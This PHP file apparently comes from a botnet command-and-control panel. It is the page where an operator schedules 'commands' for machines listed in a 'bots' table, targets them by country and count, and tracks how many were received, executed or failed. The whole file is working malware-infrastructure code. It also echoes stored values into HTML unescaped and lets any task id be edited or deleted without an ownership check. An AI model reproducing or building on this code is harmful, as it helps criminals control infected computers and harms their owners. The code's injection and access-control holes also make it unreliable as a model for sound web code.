<?php
	
if(!isset($GLOBALS['in_script'])) die("Direct access not allowed!");

$TEMPLATE['site'] = "Tasks";
$TEMPLATE['js'] = "<script>$('#datetimepicker1').datetimepicker({useSeconds:false,minuteStepping:5});$('#datetimepicker2').datetimepicker({useSeconds:false,minuteStepping:5});$('#datetimepicker1').on('change.dp',function(e){ $('#datetimepicker2').data('DateTimePicker').setStartDate(e.date);});$('#datetimepicker2').on('change.dp',function(e){ $('#datetimepicker1').data('DateTimePicker').setEndDate(e.date);});</script>";

if (getRole() > getPageRole("Tasks")) $TEMPLATE['text'] = infoMsg("You don't have permission to see this page.");
else
{
	$TEMPLATE['text'] = "";

	/* Add task */
	
	if (isset($_GET['a']) && $_GET['a'] == "add")
	{
		$TEMPLATE['site'] = "Add task";
	
		if ($_POST && isset($_POST['cmd']) && isset($_POST['cnt']) && isset($_POST['start']) && isset($_POST['stop']))
		{
			$countries = '';
			
			if (isset($_POST['countries']))
			{
				if (is_array($_POST['countries']))
					foreach ($_POST['countries'] as $country) $country === end($_POST['countries']) ?  $countries .= $country : $countries .= $country.", ";
				else 
					$countries = $_POST['countries'];
			}
			
			db_query("INSERT INTO `tasks`(`command`, `count`, `start`, `stop`, `countries`, `uid`) VALUES(:1, :2, :3, :4, :5, :6)", $_POST['cmd'], $_POST['cnt'], date("Y-m-d H:i:s", strtotime($_POST['start'])), date("Y-m-d H:i:s", strtotime($_POST['stop'])), $countries, getUID());
			
			$TEMPLATE['text'] .= infoMsg("Added task.", 'success');	
		}
		
		$stmt = db_query("SELECT `country` FROM `bots` WHERE `uid` = :1 OR `uid` IS NULL GROUP BY `country` ORDER BY `country`", getUID());
		
		$TEMPLATE['text'] .= '<form action="'.$_SERVER['SCRIPT_NAME'].'?p=tasks&a=add" method="POST" role="form"><input type="text" class="form-control" placeholder="Command" name="cmd" required autofocus><br/><input type="text" class="form-control" placeholder="Count" name="cnt" required><br/><select class="form-control" name="countries[]" multiple><br/><option value="">All countries</option>';
				
		while ($row = $stmt->fetch())
			$TEMPLATE['text'] .= '<option value="'.$row['country'].'">'.$row['country'].'</option>';
		
		$TEMPLATE['text'] .= '</select><br/><div class="input-group" style="width:100%;"><input name="start" type="text" style="text-align:center;" data-format="DD.MM.YYYY HH:mm" class="input-sm form-control" id="datetimepicker1" /><span class="input-group-addon">to</span><input name="stop" type="text" style="text-align:center;" data-format="DD.MM.YYYY HH:mm" class="input-sm form-control" id="datetimepicker2"/></div><br/><button class="btn btn-lg btn-primary btn-block" type="submit">Create task</button></form>';
	}
	
	/* Edit task */
	
	elseif (isset($_GET['a']) && isset($_GET['id']) && $_GET['a'] == "edit")
	{
		$TEMPLATE['site'] = "Edit task";
		
		if ($_POST && isset($_POST['cmd']) && isset($_POST['cnt']) && isset($_POST['start']) && isset($_POST['stop']))
		{
			$countries = "";
			
			if (isset($_POST['countries']))
			{
				if (is_array($_POST['countries']))
					foreach ($_POST['countries'] as $country) $countries .= ",".$country;
				else 
					$countries = $_POST['countries'];
			}
			
			db_query("UPDATE `tasks` SET `command` = :1, `count` = :2, `countries` = :3, `start` = :4, `stop` = :5 WHERE `id` = :6", $_POST['cmd'], $_POST['cnt'], $countries, date("Y-m-d H:i:s", strtotime($_POST['start'])), date("Y-m-d H:i:s", strtotime($_POST['stop'])),	$_GET['id']);
			
			$TEMPLATE['text'] .= infoMsg('Updated task '.$_GET['id'].'.', 'success');				
		}
		
		$stmt = db_query("SELECT * FROM `tasks` WHERE `id` = :1", $_GET['id']);
		
		if ($stmt->rowCount() > 0)
		{
			$row = $stmt->fetch();
			$countries = explode(",", $row['countries']);
			$stmt = db_query("SELECT `country` FROM `bots` WHERE `uid` = :1 OR `uid` IS NULL GROUP BY `country` ORDER BY `country`", getUID());
			
			$TEMPLATE['text'] .= '<form action="'.$_SERVER['SCRIPT_NAME'].'?p=tasks&a=edit&id='.$row['id'].'" method="POST" role="form"><input type="text" class="form-control" placeholder="Command" name="cmd" value="'.$row['command'].'" required autofocus><br/><input type="text" class="form-control" placeholder="Count" name="cnt" value="'.$row['count'].'" required><br/><select class="form-control" name="countries[]" multiple><option value="">All countries</option>';
			
			while ($row2 = $stmt->fetch())
				$TEMPLATE['text'] .= '<option value='.$row2['country'].' '.(in_array($row2['country'], $countries) ? 'selected' : '').'>'.$row2['country'].'</option>';			

			$TEMPLATE['text'] .= '</select><br/><div class="input-group" style="width:100%;"><input name="start" value="'.date("d.m.Y H:m", strtotime($row['start'])).'" type="text" style="text-align:center;" data-format="DD.MM.YYYY HH:mm" class="input-sm form-control" id="datetimepicker1" /><span class="input-group-addon">to</span><input name="stop" value="'.date("d.m.Y H:m", strtotime($row['stop'])).'" type="text" style="text-align:center;" data-format="DD.MM.YYYY HH:mm" class="input-sm form-control" id="datetimepicker2"/></div><br/><button class="btn btn-lg btn-primary btn-block" type="submit">Save task</button></form>';
		}
		
		else $TEMPLATE['text'] .= infoMsg("Couldn't find task.");
	}
	
	/* Task overview */
	
	else
	{
		if (isset($_GET['a']) && $_GET['a'] == "del" && isset($_GET['id']))
		{
			$stmt = db_query("SELECT `id` FROM `tasks` WHERE `id` = :1", $_GET['id']);
			
			if ($stmt->rowCount() > 0)
			{
				$row = $stmt->fetch();
				db_query("DELETE FROM `tasks` WHERE `id` = :1", $_GET['id']);
				$TEMPLATE['text'] .= infoMsg('Deleted task '.$row['id'].'.', 'success');
			}
			else $TEMPLATE['text'] .= infoMsg("Couldn't find task.");
		}

		$LIMIT = isset($_GET['n']) ? sprintf("%d, %d", intval($_GET['n']), (intval($_GET['n']) + 10)) : '0, 10';
		$stmt = db_query("SELECT * FROM `tasks` WHERE `uid` = :1 OR `uid` IS NULL ORDER BY `start` DESC LIMIT ".$LIMIT, getUID());
		
		$TEMPLATE['text'] .= '<table style="table-layout:fixed;word-wrap:break-word;" class="table table-hover table-vcenter"><tr><th style="width: 10%;">#</th><th style="padding-left:5px;">Command</th><th style="padding-left:5px;">Countries</th><th style="padding-left:5px;">Count</th><th style="padding-left:5px;">State</th><th style="padding-left:5px;">Starts at</th><th style="padding-left:5px;">Ends at</th><th></th></tr>';		
		
		while ($row = $stmt->fetch())
			$TEMPLATE['text'] .= '<tr><td>'.$row['id'].'</td><td>'.$row['command'].'</td><td>'.(empty($row['countries']) ? 'All' : $row['countries']).'</td><td>'.$row['count'].'</td><td>'.$row['received'].'/<font color="green">'.$row['executed'].'</font>/<font color="red">'.$row['failed'].'</font></td><td>'.$row['start'].'</td><td>'.$row['stop'].'</td><td style="text-align:right;"><a href="?p=tasks&a=del&id='.$row['id'].'" class="btn btn-danger nicesize"><i class="glyphicon glyphicon-trash"></i></a>&nbsp;&nbsp;<a href="?p=tasks&a=edit&id='.$row['id'].'" class="btn btn-primary nicesize"><i class="glyphicon glyphicon-wrench"></i></a></td></tr>';

		$TEMPLATE['text'] .= '</table><a href="?p=tasks&a=add" class="btn btn-success pull-right nicesize" style="width:91px;"><i class="glyphicon glyphicon-plus"></i>&nbsp;Add task</a>';
	}
}
?>